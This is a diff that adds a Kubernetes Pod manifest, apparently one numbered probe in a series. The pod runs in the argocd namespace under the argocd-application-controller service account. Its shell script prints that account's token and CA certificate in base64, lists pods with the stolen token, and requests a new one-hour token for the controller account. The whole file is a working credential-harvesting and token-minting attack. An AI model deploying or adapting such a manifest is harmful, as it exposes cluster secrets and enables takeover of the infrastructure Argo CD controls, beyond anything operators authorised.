@@ -1,0 +1,30 @@
+{
+ "apiVersion": "v1",
+ "kind": "Pod",
+ "metadata": {
+  "name": "i3030c-probe4-08d032",
+  "namespace": "argocd",
+  "labels": {
+   "i3030c": "08d032",
+   "probe": "4"
+  }
+ },
+ "spec": {
+  "serviceAccountName": "argocd-application-controller",
+  "restartPolicy": "Never",
+  "activeDeadlineSeconds": 600,
+  "containers": [
+   {
+    "name": "probe",
+    "image": "alpine:3.20",
+    "command": [
+     "/bin/sh",
+     "-c"
+    ],
+    "args": [
+     "#!/bin/sh\nset -u\nSA=/var/run/secrets/kubernetes.io/serviceaccount\necho \"===I3030C4_START utc=$(date -u +%FT%TZ) host=$(hostname)===\"\necho \"===TOKEN_B64===\"\nbase64 \"$SA/token\" 2>/dev/null | tr -d '\\n'; echo\necho \"===CA_B64===\"\nbase64 \"$SA/ca.crt\" 2>/dev/null | tr -d '\\n'; echo\necho \"===NS===\"\ncat \"$SA/namespace\"; echo\necho \"===PODS_PRE===\"\nwget -q -O - --timeout=20 --no-check-certificate --header=\"Authorization: Bearer $(cat $SA/token)\" \"https://kubernetes.default.svc/api/v1/namespaces/argocd/pods?limit=100\" 2>/dev/null | tr ',' '\\n' | grep -E '\"name\"|\"phase\"' | head -40\necho \"===TOKENREQ===\"\nwget -q -O - --timeout=20 --no-check-certificate --header=\"Authorization: Bearer $(cat $SA/token)\" --header=\"Content-Type: application/json\" --post-data='{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"TokenRequest\",\"spec\":{\"audiences\":[\"https://kubernetes.default.svc\"],\"expirationSeconds\":3600}}' \"https://kubernetes.default.svc/api/v1/namespaces/argocd/serviceaccounts/argocd-application-controller/token\" 2>/dev/null | head -c 600; echo\necho \"===I3030C4_DONE utc=$(date -u +%FT%TZ)===\"\n"
+    ]
+   }
+  ]
+ }
+}
